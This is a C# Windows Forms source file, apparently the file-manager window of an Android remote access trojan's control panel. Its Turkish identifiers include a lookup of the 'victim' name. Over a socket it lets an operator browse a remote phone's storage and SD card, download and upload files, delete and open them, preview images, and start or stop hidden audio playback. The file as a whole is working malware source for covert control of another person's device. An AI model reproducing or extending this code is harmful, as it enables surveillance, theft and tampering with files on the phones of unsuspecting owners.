using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Windows.Forms;
namespace SV
{
    public partial class FİleManager : Form
    {
        Socket soketimiz;
        public string ID = "";
        ListViewItem dizin_yukari = new ListViewItem("...");
        ListViewItem dizin_yukari_ = new ListViewItem("...");
        public FİleManager(Socket s, string aydi)
        {
            InitializeComponent();
            soketimiz = s;
            ID = aydi;
            dizin_yukari.ImageIndex = 13;
            dizin_yukari_.ImageIndex = 13;
        }
        private void indirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    toolStripProgressBar1.Style = ProgressBarStyle.Marquee; toolStripStatusLabel1.Text = "Downloading..";
                    Form1.KomutGonder("INDIR", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public void bilgileriIsle(string s1, string s2)
        {
            try
            {
                switch (s1)
                {
                    case "IKISIDE":
                        listView1.Items.Clear();
                        listView2.Items.Clear();
                        break;
                    case "CIHAZ":
                        listView1.Items.Clear();
                        break;
                    case "SDCARD":
                        listView2.Items.Clear();
                        break;
                }

                try { listView1.Items.Add(dizin_yukari); } catch (Exception) { }
                try { listView2.Items.Add(dizin_yukari_); } catch (Exception) { }

                if (s2 == "BOS")
                {
                    switch (s1)
                    {
                        case "IKISIDE":
                            listView1.BackgroundImageLayout = ImageLayout.Zoom;
                            listView1.BackgroundImage =
                            Properties.Resources.nothing;
                            listView2.BackgroundImageLayout = ImageLayout.Zoom;
                            listView2.BackgroundImage =
                            Properties.Resources.nothing;
                            break;
                        case "CIHAZ":
                            listView1.BackgroundImageLayout = ImageLayout.Zoom;
                            listView1.BackgroundImage =
                            Properties.Resources.nothing;
                            break;
                        case "SDCARD":
                            listView2.BackgroundImageLayout = ImageLayout.Zoom;
                            listView2.BackgroundImage =
                            Properties.Resources.nothing;
                            break;

                    }
                }
                else
                {
                    string[] lines = s2.Split('<');
                    foreach (string line in lines)
                    {
                        string[] parse = line.Split('=');
                        try
                        {
                            ListViewItem lv = new ListViewItem(parse[0]);
                            lv.SubItems.Add(parse[1]);
                            lv.SubItems.Add(parse[2]);
                            lv.SubItems.Add(parse[3]);
                            lv.SubItems.Add(parse[4]);
                            if (parse[2] == "")
                            {
                                lv.ImageIndex = 0;
                            }
                            else
                            {
                                switch (parse[2].ToLower())
                                {
                                    case ".txt":
                                        lv.ImageIndex = 11;
                                        break;
                                    case ".apk":
                                        lv.ImageIndex = 1;
                                        break;
                                    case ".jpeg":
                                    case ".jpg":
                                    case ".png":
                                    case ".gif":
                                        lv.ImageIndex = 4;
                                        break;
                                    case ".avi":
                                    case ".mp4":
                                    case ".flv":
                                    case ".mkv":
                                    case ".wmv":
                                    case ".mpg":
                                    case ".mpeg":
                                        lv.ImageIndex = 7;
                                        break;
                                    case ".mp3":
                                    case ".wav":
                                    case ".ogg":
                                        lv.ImageIndex = 6;
                                        break;
                                    case ".rar":
                                    case ".zip":
                                        lv.ImageIndex = 8;
                                        break;
                                    case ".pdf":
                                        lv.ImageIndex = 10;
                                        break;
                                    case ".html":
                                    case ".htm":
                                        lv.ImageIndex = 9;
                                        break;
                                    case ".doc":
                                    case ".docx":
                                        lv.ImageIndex = 2;
                                        break;
                                    case ".xlsx":
                                        lv.ImageIndex = 3;
                                        break;
                                    case ".pptx":
                                        lv.ImageIndex = 5;
                                        break;
                                    default:
                                        lv.ImageIndex = 12;
                                        break;
                                }
                            }

                            if (parse[4] == "CİHAZ")
                            {
                                listView1.Items.Add(lv);
                                textBox1.Text = parse[5];

                            }
                            else
                            {
                                if (parse[4] == "SDCARD")
                                {
                                    listView2.Items.Add(lv);
                                    textBox2.Text = parse[5];
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
        }
        public void karsiyaYukle(TextBox textBox)
        {
            if (string.IsNullOrEmpty(textBox.Text) == false)
            {
                using (OpenFileDialog op = new OpenFileDialog()
                {
                    Multiselect = false,
                    Filter = "All files|*.*",
                    Title = "Select a file to upload.."
                })
                {
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            Form1.KomutGonder("DOSYABYTE", "[VERI]"
                                + Convert.ToBase64String(File.ReadAllBytes(op.FileName)) + "[VERI]" + op.FileName.Substring(
                                op.FileName.LastIndexOf(@"\") + 1) + "[VERI]" + textBox.Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                        toolStripProgressBar1.Style = ProgressBarStyle.Marquee; toolStripStatusLabel1.Text = "Uploading..";
                    }
                }
            }
        }
        private void yükleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox1);
        }
        public void yenile()
        {
            if (textBox1.Text != "")
            {
                try
                {
                    Form1.KomutGonder("FOLDERFILE", "[VERI]" + textBox1.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public void yenileSD()
        {
            if (textBox2.Text != "")
            {
                listView2.BackgroundImage = null;
                try
                {
                    Form1.KomutGonder("FILESDCARD", "[VERI]" + textBox2.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BackgroundImage = null;
            yenile();
        }

        private void sİlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.KomutGonder("DELETE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
             listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void açToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.KomutGonder("DOSYAAC", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                     listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void açToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.KomutGonder("DOSYAAC", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void yenileToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            yenileSD();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Form1.KomutGonder("DELETE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void gizliÇalToolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void indirToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    toolStripProgressBar1.Style = ProgressBarStyle.Marquee; toolStripStatusLabel1.Text = "Downloading..";
                    Form1.KomutGonder("INDIR", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Text = Text = "File Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView1.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox1.Text != "/storage/emulated/0")
                    {
                        pictureBox1.Visible = false;
                        listView1.BackgroundImage = null;
                        textBox1.Text = textBox1.Text.Replace(textBox1.Text.Substring(textBox1.Text.LastIndexOf("/")),
                            "");
                        yenile();
                    }
                }
                else
                {
                    if (listView1.SelectedItems[0].ImageIndex == 0)
                    {
                        listView1.BackgroundImage = null;
                        textBox1.Text = listView1.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            Form1.KomutGonder("FOLDERFILE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void listView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                Text = "File Manager - "+((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView2.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox2.Text.Count(slash => slash == '/') > 2)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = textBox2.Text.Replace(textBox2.Text.Substring(textBox2.Text.LastIndexOf("/")),
                            "");
                        yenileSD();
                    }
                }
                else
                {
                    if (listView2.SelectedItems[0].ImageIndex == 0)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = listView2.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            Form1.KomutGonder("FILESDCARD", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void yükleToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox2);
        }

        private void başlatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    if (listView1.SelectedItems[0].ImageIndex == 6)
                    {
                        Form1.KomutGonder("GIZLI", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                 listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                    }
                }
                catch (Exception) { }
            }
        }

        private void durdurToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GIZKAPA", "[VERI][0x09]", soketimiz);
            }
            catch (Exception) { }
        }
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].ImageIndex == 4)
                {
                    Form1.KomutGonder("PRE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
             listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                else { pictureBox1.Visible = false; }

                if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
                {
                    label1.Text = "Name: " + listView1.SelectedItems[0].Text;
                    label2.Text = "Path: " + listView1.SelectedItems[0].SubItems[1].Text;
                    label3.Text = "Size: " + listView1.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView1.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView1.SelectedItems[0].SubItems[4].Text.Replace("CİHAZ", "Device");
                }
            }
        }

        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                if (listView2.SelectedItems[0].ImageIndex == 4)
                {
                    Form1.KomutGonder("PRE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                else { pictureBox1.Visible = false; }
                if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
                {
                    label1.Text = "Name: " + listView2.SelectedItems[0].Text;
                    label2.Text = "Path: " + listView2.SelectedItems[0].SubItems[1].Text;
                    label3.Text = "Size: " + listView2.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView2.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView2.SelectedItems[0].SubItems[4].Text;
                }
            }
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    if (listView2.SelectedItems[0].ImageIndex == 6)
                    {
                        Form1.KomutGonder("GIZLI", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                    }
                }
                catch (Exception) { }
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GIZKAPA", "[VERI][0x09]", soketimiz);
            }
            catch (Exception) { }
        }
    }
}
